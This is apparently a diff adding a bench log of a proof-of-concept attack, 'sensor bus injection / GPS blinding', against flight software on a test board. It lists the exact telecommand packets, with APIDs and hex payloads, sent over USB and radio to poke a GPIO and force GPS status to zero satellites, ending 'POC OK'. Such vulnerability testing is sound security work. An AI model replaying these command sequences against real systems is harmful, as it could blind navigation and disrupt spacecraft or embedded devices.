@@ -1,0 +1,81 @@
+[   0.000] ========================================================================
+[   0.000] V-26 sensor bus injection / GPS blinding
+[   0.000] ========================================================================
+[   1.518] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.855] --> TC apid=0x0A via=usb AES  payload=00
+[   8.907] <-- TM apid=0x0A clear len=3
+[   8.958] --> TC apid=0x1D via=usb clear payload=0101
+[   8.999] <-- TM apid=0x1D clear len=4
+[   8.999] --> TC apid=0x11 via=usb clear payload=00
+[   9.458] <-- TM apid=0x11 clear len=9
+[   9.459] --> TC apid=0x15 via=usb clear payload=001005
+[   9.919] <-- TM apid=0x15 clear len=6
+[   9.919] --> TC apid=0x0D via=usb clear payload=01
+[  10.370] <-- TM apid=0x0D clear len=4
+[  10.411] --> TC apid=0x1D via=usb clear payload=03
+[  10.463] <-- TM apid=0x1D clear len=4
+[  10.463] <-- TM apid=0x09 clear len=9
+[  10.514] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.566] <-- TM apid=0x1D clear len=4
+[  10.566] --> TC apid=0x10 via=usb clear payload=00
+[  10.617] <-- TM apid=0x10 clear len=4
+[  10.617] --> TC apid=0x21 via=usb clear payload=00
+[  11.068] <-- TM apid=0x21 clear len=6
+[  11.068] --> TC apid=0x24 via=usb clear payload=0000
+[  11.119] <-- TM apid=0x24 clear len=8
+[  11.119] --> TC apid=0x24 via=usb clear payload=0100
+[  11.171] <-- TM apid=0x24 clear len=8
+[  11.171] --> TC apid=0x24 via=usb clear payload=0200
+[  11.212] <-- TM apid=0x24 clear len=8
+[  11.212] --> TC apid=0x24 via=usb clear payload=0300
+[  11.264] <-- TM apid=0x24 clear len=8
+[  11.264] --> TC apid=0x25 via=usb clear payload=0080
+[  11.315] <-- TM apid=0x25 clear len=4
+[  11.315] --> TC apid=0x1E via=usb clear payload=01
+[  11.825] <-- TM apid=0x1E clear len=5
+[  11.825] --> TC apid=0x1D via=usb clear payload=0b
+[  11.917] <-- TM apid=0x1D clear len=4
+[  11.917] --> TC apid=0x05 via=usb clear payload=12
+[  12.376] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.877] <-- TM apid=0x1F clear len=4
+[  12.877] --> TC apid=0x1F via=usb clear payload=05
+[  13.389] <-- TM apid=0x1F clear len=4
+[  13.389] --> TC apid=0x0A via=usb clear payload=01
+[  13.433] <-- TM apid=0x0A AES len=3
+[  21.522] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  29.998] <-- TM apid=0x0E AES len=18
+[  29.998] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.070] --> TC apid=0x1B via=radio AES  payload=010300
+[  30.531] <-- TM apid=0x1B clear len=8
+[  30.573] --> TC apid=0x0C via=usb AES  payload=-
+[  30.628] <-- TM apid=0x0C AES len=27
+[  30.628] --> advance(15000 ms)
+[  45.677] <-- TM apid=0x27 clear len=4
+[  45.678] 15 s window with mask=0: mission TM frames = 0
+[  45.678] --> TC apid=0x1B via=radio AES  payload=010303
+[  46.119] <-- TM apid=0x1B clear len=8
+[  46.119] --> advance(15000 ms)
+[  61.129] <-- TM apid=0x27 clear len=4
+[  61.131] <-- TM apid=0x01 AES len=8
+[  61.133] <-- TM apid=0x0E AES len=30
+[  61.134] <-- TM apid=0x08 AES len=20
+[  61.186] --> TC apid=0x1A via=radio AES  payload=4b00000000000000000000000000000000000000000000000000000000000000
+[  61.238] <-- TM apid=0x1A clear len=8
+[  61.289] --> TC apid=0x18 via=radio AES  payload=00200020004001400100
+[  61.750] <-- TM apid=0x18 clear len=12
+[  61.792] --> TC apid=0x0E via=usb AES  payload=-
+[  70.314] <-- TM apid=0x0E AES len=30
+[  70.314] GET_NAV after GPIO poke: status=0x10 sats=0 lat=0
+[  70.314] --> TC apid=0x11 via=radio AES  payload=01
+[  70.747] <-- TM apid=0x09 AES len=21
+[  70.748] <-- TM apid=0x11 AES len=9
+[  70.748] --> POWER CYCLE (scratch + SRAM die, flash survives)
+[  72.954] --> REARM (bench parity: post-POWERCYCLE)
+[  73.119] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  81.597] <-- TM apid=0x0E AES len=18
+[  81.597] --> TC apid=0x0E via=usb AES  payload=-
+[  90.098] <-- TM apid=0x0E AES len=30
+[  90.098] -- console tail: [TC - SPP] APID=0x027 SEQ=1 LEN=29 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x011 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [INFO] USB Device configured successfully | [INFO] ACC OK | [INFO] BME OK | [INFO] GPS UART configured at 9600 baud | [INFO] Radio 0 Configured Successfully! | [INFO] Radio 1 Configured Successfully! | [TC - SPP] APID=0x027 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x014 SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO | [WARN] GPS not detected on UART, using zero-coordinate fallback | [TC - SPP] APID=0x00E SEQ=1 LEN=16 FLAGS=1 SEC_HDR=NO
+[  90.098] ========================================================================
+[  90.098] POC OK
+[  90.098] ========================================================================
